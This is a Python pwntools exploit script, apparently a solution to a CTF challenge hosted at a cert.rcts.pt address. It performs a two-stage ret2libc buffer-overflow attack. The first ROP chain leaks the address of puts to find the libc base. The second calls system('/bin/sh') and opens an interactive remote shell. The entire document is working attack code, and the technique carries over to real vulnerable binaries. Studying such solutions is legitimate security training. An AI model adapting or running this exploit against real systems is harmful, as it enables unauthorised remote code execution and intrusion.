from pwn import *

context(os='linux', arch='amd64') 
context.log_level = 'info'

p = remote('challenges.ctf.cert.rcts.pt', 36422)
binary = ELF('./program', checksec=False)
rop = ROP(binary)
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so', checksec=False)

buff = "A"*0x28

rop.puts(binary.got['puts'])
rop.call(binary.symbols['ret'])

log.info("ROP chain #1:\n" + str(rop.dump()))

stage1 = buff + rop.chain()

p.recv()
p.sendline(stage1)

puts_leak = u64(p.recvline().rstrip().ljust(8, "\x00"))
log.success ("puts addr: " + hex(puts_leak))

libc.address = puts_leak - libc.symbols['puts']
log.success ("libc addr: " + hex(libc.address))

rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh\x00')), 0, 0)

log.info("ROP Chain #2: \n" + rop2.dump())
stage2 = buff + rop2.chain()
p.recv()
p.sendline(stage2)
p.interactive()
